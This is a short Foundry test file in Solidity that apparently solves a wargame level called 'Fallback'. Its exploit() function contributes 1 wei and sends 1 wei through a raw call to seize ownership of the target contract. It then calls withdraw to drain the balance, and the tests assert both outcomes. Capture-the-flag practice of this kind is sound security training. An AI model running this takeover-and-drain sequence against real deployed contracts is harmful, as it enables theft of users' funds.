// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Level01.sol";

contract Level01Test is Test {
    Fallback public target;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        vm.deal(attacker.addr, 2 wei);
        target = new Fallback();
    }

    function test_getContractOwnership() public {
        exploit();
        assertEq(target.owner(), attacker.addr);
    }

    function test_drainContract() public {
        exploit();
        assertEq(address(target).balance, 0);
    }

    function exploit() private {
        vm.startPrank(attacker.addr);

        target.contribute{value: 1 wei}();
        address(target).call{value: 1 wei}("");
        target.withdraw();

        vm.stopPrank();
    }
}
